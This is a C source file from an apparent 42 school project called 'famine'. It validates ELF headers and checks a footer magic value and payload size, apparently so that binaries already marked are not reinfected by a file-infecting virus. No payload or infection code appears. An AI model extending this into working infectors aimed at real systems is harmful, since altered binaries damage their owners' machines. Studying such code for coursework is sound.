/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   check.c                                            :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: mbatty <mbatty@student.42angouleme.fr>     +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2026/03/04 11:30:42 by mbatty            #+#    #+#             */
/*   Updated: 2026/04/14 18:19:19 by mbatty           ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include "famine.h"

#include <fcntl.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>
#include <dirent.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <elf.h>

int	check_elf_hdr(void *map, size_t size)
{
	Elf64_Ehdr	*hdr;
	int			class;
	int			is_little_endian;
	int			is_x64;
	int			data;

	if (size < sizeof(Elf64_Ehdr))
		return (-1);

	hdr = map;

	if (memcmp(hdr->e_ident, ELFMAG, sizeof(ELFMAG) - 1))
		return (-1);

	if (hdr->e_ident[EI_VERSION] != 1)
		return (-1);

	class = hdr->e_ident[EI_CLASS];
	if (class != ELFCLASS32 && class != ELFCLASS64)
		return (-1);
	is_x64 = class == ELFCLASS64;

	data = hdr->e_ident[EI_DATA];
	if (data != ELFDATA2LSB && data != ELFDATA2MSB)
		return (-1);
	is_little_endian = data == ELFDATA2LSB;

	int	type = is_little_endian ? le16toh(hdr->e_type) : be16toh(hdr->e_type);
	if (type != ET_REL && type != ET_EXEC && type != ET_DYN)
		return (-1);

	int	machine = is_little_endian ? le16toh(hdr->e_machine) : be16toh(hdr->e_machine);
	if ((!is_x64 && machine != EM_386) || (is_x64 && machine != EM_X86_64))
		return (-1);

	int version = is_little_endian ? le32toh(hdr->e_version) : be32toh(hdr->e_version);
	if (version != 1)
		return (-1);
	return (0);
}

t_footer	get_footer(const char *path);

int	check_signature(t_ctx *ctx, const char *path)
{
	t_footer	footer = get_footer(path);
	ctx->payload_size = footer.payload_size;
	if (footer.magic == FOOTER_MAGIC)
		return (-1);
	return (0);
}
